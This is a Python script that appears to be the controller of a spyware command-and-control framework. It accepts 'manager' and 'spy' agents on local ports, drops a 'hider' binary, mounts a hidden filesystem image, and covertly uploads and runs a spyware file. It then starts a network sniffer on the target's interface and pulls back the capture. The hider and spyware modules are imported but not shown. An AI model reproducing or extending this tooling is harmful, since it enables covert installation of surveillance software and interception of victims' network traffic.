from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep
from contParams import *
from structParams import *
from agentRecruiter import AgentRecruiter
import threading
import configparser
from operation import Operation
from icecream import ic


HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def main():
    targetHiderPath = "./sentHider.o"

    image_path = "fs.iso"
    mount_path = "fs"

    operDict: dict[str, Operation] = dict()
    # recrutionEvent = threading.Event()
    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
    manegerRecruiter.start()
    spyRecruiter.start()

    while len(operDict) == 0:
        sleep(1)
    sleep(1)
    ic(operDict)
    op: Operation = list(operDict.values())[0]
    ic(op)
    ic(op.managerAgent)
    ic(op.spyAgent)

    manegerAgent: Agent = op.managerAgent

    print(
        manegerAgent.write_file(
            "hider",
            targetHiderPath,
        )
    )

    print(manegerAgent.hider_setup(targetHiderPath, image_path, mount_path))

    print(
        manegerAgent.hidden_action_with_upload(
            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
            "spyware",
            "sentSpyware9.spy",
        )
    )
    while op.spyAgent is None:
        sleep(1)
    spyAgent: Agent = op.spyAgent

    print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))

    params = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
    print(spyAgent.runContraption(params, 10))
    sleep(30)
    print(spyAgent.retrieve_file("0.sniff"))


if __name__ == "__main__":
    main()
